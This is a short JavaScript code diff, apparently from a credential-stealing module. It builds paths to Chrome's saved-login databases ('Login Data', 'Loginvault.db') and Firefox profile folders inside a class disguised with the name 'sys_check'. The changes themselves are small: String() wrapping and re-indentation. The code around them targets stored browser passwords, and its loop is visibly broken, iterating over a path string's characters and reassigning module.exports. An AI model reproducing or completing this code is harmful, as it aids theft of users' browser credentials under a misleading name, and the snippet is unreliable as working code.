@@ -4,7 +4,7 @@ const local = process.env.LOCALAPPDATA,
 	fs = require('fs'),
 		p = require('path'),
 	chrome_win = p.join(
-		local,
+		String(local),
 		"Google",
 		"Chrome",
 		"User Data",
@@ -12,7 +12,7 @@ const local = process.env.LOCALAPPDATA,
 		"Login Data"
 	),
 	fire_win = p.join(
-		roaming,
+		String(roaming),
 		"Mozilla",
 		"Firefox",
 		"Profiles" 
@@ -21,9 +21,9 @@ const local = process.env.LOCALAPPDATA,
 module.exports = class sys_check {
 	constructor() {
 		for (const folder of p.normalize(fire_win)) {
-		module.exports = f = (() => {
-			fs.readdirSync(folder);
-		});
+			module.exports = f = (() => {
+				fs.readdirSync(folder);
+			});
 		}
 		this.win32_validBrowsers = [
 			[/chrome/, `${p.normalize(chrome_win)}/Loginvault.db`],
